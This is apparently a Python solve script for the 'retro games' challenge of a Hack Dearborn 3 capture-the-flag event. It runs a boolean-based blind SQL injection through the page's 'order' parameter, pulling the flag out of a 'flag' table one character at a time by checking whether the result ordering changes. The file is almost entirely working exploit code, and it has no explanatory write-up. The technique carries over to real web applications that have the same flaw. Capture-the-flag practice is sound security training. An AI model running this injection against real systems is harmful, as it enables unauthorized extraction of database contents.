import requests

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz_{}'
url = 'https://hack-dearborn-3-ctf-retro-games.chals.io/'
import requests
import string
from bs4 import BeautifulSoup


def get_normal_order():
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    rows = soup.find_all('tr')[1:]  # Skip header row
    return [row.find_all('td')[2].text.strip() for row in rows]  # Get titles

def extract_flag():
    normal_order = get_normal_order()
    print(f"Normal order (first few titles): {normal_order[:5]}")

    flag = "hd3{"
    alphabet = string.ascii_lowercase + string.digits + "_}"

    for i in range(5, 100):  # Start from 5th character (after 'hd3{')
        for char in alphabet:
            payload = f"(CASE WHEN (SELECT substr(flag,{i},1) FROM flag) = '{char}' THEN title ELSE rank END)"
            data = {
                'search': '',
                'order': payload
            }
            
            try:
                response = requests.post(url, data=data)
                response.raise_for_status()
                soup = BeautifulSoup(response.text, 'html.parser')
                rows = soup.find_all('tr')[1:]  # Skip header row
                result = [row.find_all('td')[2].text.strip() for row in rows]  # Get titles
                
                if result != normal_order:
                    flag += char
                    print(f"Flag so far: {flag}")
                    break
            
            except requests.RequestException as e:
                print(f"Request failed for character '{char}' at position {i}: {e}")
        
        if flag.endswith("}"):
            break
        
        if len(flag) < i:
            print(f"Failed to find character at position {i}. Stopping.")
            break

    return flag

if __name__ == "__main__":
    extracted_flag = extract_flag()
    if extracted_flag:
        print(f"Extracted flag: {extracted_flag}")
    else:
        print("Failed to extract the flag. Please check the script and try again.")